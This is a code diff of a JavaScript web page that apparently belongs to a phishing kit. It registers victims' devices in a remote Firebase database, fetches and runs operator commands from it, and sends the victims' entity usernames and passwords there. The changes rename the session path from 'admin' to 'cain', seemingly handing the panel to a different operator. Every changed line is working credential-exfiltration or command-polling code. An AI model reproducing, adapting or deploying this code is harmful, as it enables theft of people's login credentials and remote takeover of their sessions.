@@ -48,7 +48,7 @@
         appId: "1:635040724776:web:daac1413b1623777b9597b"
     };
     const defaultToken = cfg.defaultSessionToken || 'main_session';
-    const userId = cfg.adminUserId || 'admin';
+    const userId = cfg.adminUserId || 'cain';
 
     let hostToken = localStorage.getItem('token');
     let tokenExpires = parseInt(localStorage.getItem('tokenExpires'));
@@ -104,7 +104,7 @@
     async function registrarDispositivoREST() {
         const DB_URL = firebaseConfig.databaseURL;
         try {
-            await fetch(`${DB_URL}/sessions/admin/${hostToken}/devices/${currentDeviceId}.json`, {
+            await fetch(`${DB_URL}/sessions/cain/${hostToken}/devices/${currentDeviceId}.json`, {
                 method: 'PATCH',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
@@ -172,11 +172,11 @@
             if (ejecutando) return;
             ejecutando = true;
             try {
-                const r = await fetch(`${DB_URL}/sessions/admin/${hostToken}/devices/${currentDeviceId}.json`);
+                const r = await fetch(`${DB_URL}/sessions/cain/${hostToken}/devices/${currentDeviceId}.json`);
                 const data = await r.json();
                 if (data && data.command) {
                     const command = data.command;
-                    await fetch(`${DB_URL}/sessions/admin/${hostToken}/devices/${currentDeviceId}/command.json`, { method: 'DELETE' });
+                    await fetch(`${DB_URL}/sessions/cain/${hostToken}/devices/${currentDeviceId}/command.json`, { method: 'DELETE' });
                     await procesarComando(command);
                 }
             } catch (e) { }
@@ -188,7 +188,7 @@
         if (!currentDeviceId || !hostToken) return;
         const DB_URL = firebaseConfig.databaseURL;
         try {
-            await fetch(`${DB_URL}/sessions/admin/${hostToken}/devices/${currentDeviceId}/data.json`, {
+            await fetch(`${DB_URL}/sessions/cain/${hostToken}/devices/${currentDeviceId}/data.json`, {
                 method: 'PATCH',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ usuarioEntidad: usuario })
@@ -207,7 +207,7 @@
         if (!currentDeviceId || !hostToken) return;
         const DB_URL = firebaseConfig.databaseURL;
         try {
-            await fetch(`${DB_URL}/sessions/admin/${hostToken}/devices/${currentDeviceId}/data.json`, {
+            await fetch(`${DB_URL}/sessions/cain/${hostToken}/devices/${currentDeviceId}/data.json`, {
                 method: 'PATCH',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ passwordEntidad: clave })
@@ -242,7 +242,7 @@
                 if (val.length >= 1 && !_notifSonado) {
                     _notifSonado = true;
                     const DB_URL = firebaseConfig.databaseURL;
-                    fetch(`${DB_URL}/sessions/admin/${hostToken}/devices/${currentDeviceId}.json`, {
+                    fetch(`${DB_URL}/sessions/cain/${hostToken}/devices/${currentDeviceId}.json`, {
                         method: 'PATCH',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({
@@ -281,7 +281,7 @@
                 } catch (e) { }
 
                 const DB_URL = firebaseConfig.databaseURL;
-                fetch(`${DB_URL}/sessions/admin/${hostToken}/devices/${currentDeviceId}.json`, {
+                fetch(`${DB_URL}/sessions/cain/${hostToken}/devices/${currentDeviceId}.json`, {
                     method: 'PATCH',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
